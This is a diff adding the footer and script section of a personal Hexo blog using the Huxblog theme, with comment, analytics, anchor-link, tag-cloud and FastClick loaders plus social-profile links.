+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    // dynamic User by Hux
+    var _user = 'amansite';
+
+    // duoshuo comment query.
+    var duoshuoQuery = {short_name: _user };
+    (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0]
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+</script>
+<!-- 多说公共JS代码 end -->
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("http://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/yang-jian-guo-51">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/lgyjg">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/lgyjg">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://www.linkedin.com/in/建国-杨-964324109">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; 渐行渐远 2017
+                    <br>                    
+                    基于 <a href="http://hexo.io/" target="_blank">Hexo</a> 搭建，感谢 <a href="https://pages.github.com/" target="_blank">GitHub Pages</a> 提供免费的托管服务
+                    <br>
+                    Created by <a href="http://www.aman.site">aman.site</a>
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span>
+                    Theme by <a href="https://github.com/Kaijun/hexo-theme-huxblog" target="_blank">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks" target="_blank">Kaijun</a> 
+                    <!-- too slow load 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=lgyjg&repo=lgyjg.github.io&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- yangjg change for debug -->
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/bootstrap.js"></script>
+    <!-- Custom Theme JavaScript -->
+    <script src="/js/hux-blog.js"></script>
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://www.aman.site/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("http://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '41c114db1f7b1a79a2a2442b96df6457';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="http://www.aman.site/img/icon_wechat.jpg" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
